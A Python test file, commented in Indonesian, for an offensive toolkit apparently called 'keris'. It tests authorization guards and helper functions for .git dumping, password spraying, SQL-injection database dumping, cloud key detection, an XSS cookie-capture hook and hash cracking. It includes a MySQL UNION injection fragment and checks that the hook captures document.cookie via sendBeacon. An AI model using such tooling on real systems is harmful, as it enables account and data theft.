"""Test modul overpowered kit: guard, helper murni, dan deteksi.

Modul-modul baru (gitdump, authbypass, spray, dbdump, cloudtakeover,
xsshook, k8s, hashcrack) diuji untuk:
- guard authorization (tanpa --authorized -> menolak)
- helper logika murni (parsing, deteksi, generate) tanpa network
"""

import os
import sys

sys.path.insert(0, os.path.join(os.path.dirname(os.path.dirname(os.path.abspath(__file__)))))


class TestGitDump:
    def test_requires_authorized(self):
        from keris.modules.gitdump import dump_git
        assert dump_git("http://x", None, authorized=False) == []

    def test_parse_index_entries(self):
        import struct
        from keris.modules.gitdump import _parse_index_entries
        entries = [
            (b"config/credentials.json", b"a" * 20),
            (b"src/app/secrets.py", b"b" * 20),
        ]
        data = b"DIRC" + struct.pack(">II", 2, 2)
        for name, sha in entries:
            header = struct.pack(">IIIIIIIIII", 0, 0, 0, 0, 0o100644, 0, 0, 0, 0, 0)
            entry = header + sha + struct.pack(">H", len(name)) + name + b"\x00"
            pad = (8 - len(entry) % 8) % 8
            data += entry + b"\x00" * pad
        parsed = _parse_index_entries(data)
        names = [p for p, _ in parsed]
        assert names == ["config/credentials.json", "src/app/secrets.py"]
        assert parsed[0][1] == "61" * 20  # sha hex dari b"a"*20

    def test_decompress(self):
        import zlib
        from keris.modules.gitdump import _decompress
        raw = b"blob 5\x00hello"
        assert _decompress(zlib.compress(raw)) == raw
        assert _decompress(b"garbage") == b""


class TestAuthBypass:
    def test_requires_authorized(self):
        from keris.modules.authbypass import test_bypass
        assert test_bypass("http://x", None, authorized=False) == []

    def test_blocked_detect(self):
        from keris.modules.authbypass import _blocked
        assert _blocked("Access forbidden 403")
        assert not _blocked("<html>welcome dashboard</html>")


class TestSpray:
    def test_requires_authorized(self):
        from keris.modules.spray import spray
        assert spray("http://x", None, [], authorized=False) == []

    def test_looks_success(self):
        from keris.modules.spray import _looks_success
        ok_b, m = _looks_success("Welcome to dashboard, logout")
        assert ok_b is True
        ok_b, _ = _looks_success("Invalid username or password")
        assert ok_b is False
        ok_b, m = _looks_success("Too many attempts, try again later")
        assert ok_b is False and "lockout" in m


class TestDbDump:
    def test_requires_authorized(self):
        from keris.modules.dbdump import dump_db
        assert dump_db("http://x", None, "", "", authorized=False) == []

    def test_union_payload(self):
        from keris.modules.dbdump import _union_payload
        p = _union_payload("MySQL", 2, "database()", 3)
        assert "CONCAT(0x4b45524953,database(),0x4b45524953)" in p

    def test_reflect(self):
        from keris.modules.dbdump import _reflect
        assert _reflect("xKERISadminKERISy") == ["admin"]


class TestCloud:
    def test_requires_authorized(self):
        from keris.modules.cloudtakeover import scan_cloud
        assert scan_cloud("http://x", None, [], authorized=False) == []

    def test_detect_aws_key(self):
        from keris.modules.cloudtakeover import AWS_KEYS_RE
        assert AWS_KEYS_RE.search("AKIAIOSFODNN7EXAMPLE") is not None

    def test_gcp_service_account(self):
        from keris.modules.cloudtakeover import check_gcp_service_account
        r = check_gcp_service_account("123456789012-abc123def456ghi789jkl012mno345pq.iam.gserviceaccount.com")
        assert r is not None
        assert r["severity"] == "MEDIUM"


class TestXssHook:
    def test_requires_authorized(self):
        from keris.modules.xsshook import start_hook
        assert start_hook(authorized=False, yes=False) is None

    def test_hook_js_contains_capture(self):
        from keris.modules.xsshook import HOOK_JS
        assert "document.cookie" in HOOK_JS
        assert "sendBeacon" in HOOK_JS

    def test_server_capture_roundtrip(self):
        import json
        import base64
        from urllib.parse import quote
        from keris.modules.xsshook import XssHookServer
        srv = XssHookServer("127.0.0.1", 0)
        srv.start()
        try:
            from keris.core.http import KerisHTTP
            c = KerisHTTP(timeout=5)
            payload = base64.b64encode(json.dumps({"url": "http://x"}).encode()).decode()
            r = c.get(f"http://127.0.0.1:{srv.port}/capture?d={quote(payload)}")
            assert r.status_code == 200
            assert srv.count == 1
            assert srv.data["events"][0]["url"] == "http://x"
            c.close()
        finally:
            srv.stop()


class TestK8s:
    def test_requires_authorized(self):
        from keris.modules.k8s import scan_k8s
        assert scan_k8s("http://x", None, authorized=False) == []

    def test_is_json_list(self):
        from keris.modules.k8s import _is_json_list
        assert _is_json_list('{"items": [{"a": 1}]}')
        assert not _is_json_list("<html>forbidden</html>")
        assert not _is_json_list("plain text")


class TestHashCrack:
    def test_requires_authorized(self):
        from keris.modules.hashcrack import crack_hash
        assert crack_hash("x", authorized=False) == []

    def test_detect_md5(self):
        from keris.modules.hashcrack import detect_hash
        assert detect_hash("5f4dcc3b5aa765d61d8327deb882cf99")[0] == "MD5"

    def test_detect_sha256(self):
        from keris.modules.hashcrack import detect_hash
        h = "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855"
        assert detect_hash(h)[0] == "SHA256"

    def test_detect_unknown(self):
        from keris.modules.hashcrack import detect_hash
        assert detect_hash("zzz")[1] is False

    def test_crack_md5_password(self):
        import hashlib
        from keris.modules.hashcrack import crack_hash
        h = hashlib.md5(b"admin").hexdigest()
        f = crack_hash(h, authorized=True)
        assert any("ter-crack" in x.title for x in f)

    def test_ntlm(self):
        from keris.modules.hashcrack import ALGO_FUNCS
        h = ALGO_FUNCS["NTLM"]("admin")
        # hash NTLM yang dikenal untuk "admin"
        assert h == "209c6174da490caeb422f3fa5a7ae634"


class TestCliRegistration:
    def test_gitdump_subcommand(self):
        from keris.__main__ import _parse_args
        a = _parse_args(["gitdump", "http://x", "--authorized"])
        assert a.command == "gitdump"

    def test_authbypass_subcommand(self):
        from keris.__main__ import _parse_args
        a = _parse_args(["authbypass", "http://x", "--endpoint", "/admin", "--authorized"])
        assert a.command == "authbypass"
        assert a.endpoint == ["/admin"]

    def test_spray_subcommand(self):
        from keris.__main__ import _parse_args
        a = _parse_args(["spray", "http://x", "--users", "a,b", "--authorized"])
        assert a.command == "spray"
        assert a.users == "a,b"

    def test_dbdump_subcommand(self):
        from keris.__main__ import _parse_args
        a = _parse_args(["dbdump", "http://x", "--vuln-url", "http://x/s?id=1",
                         "--vuln-param", "id", "--authorized"])
        assert a.command == "dbdump"

    def test_cloud_subcommand(self):
        from keris.__main__ import _parse_args
        a = _parse_args(["cloud", "http://x", "--bucket", "acme", "--authorized"])
        assert a.command == "cloud"

    def test_xsshook_subcommand(self):
        from keris.__main__ import _parse_args
        a = _parse_args(["xsshook", "--bind", "127.0.0.1", "--yes", "--authorized"])
        assert a.command == "xsshook"

    def test_k8s_subcommand(self):
        from keris.__main__ import _parse_args
        a = _parse_args(["k8s", "http://x", "--authorized"])
        assert a.command == "k8s"

    def test_crack_subcommand(self):
        from keris.__main__ import _parse_args
        a = _parse_args(["crack", "--hash", "abc", "--authorized"])
        assert a.command == "crack"
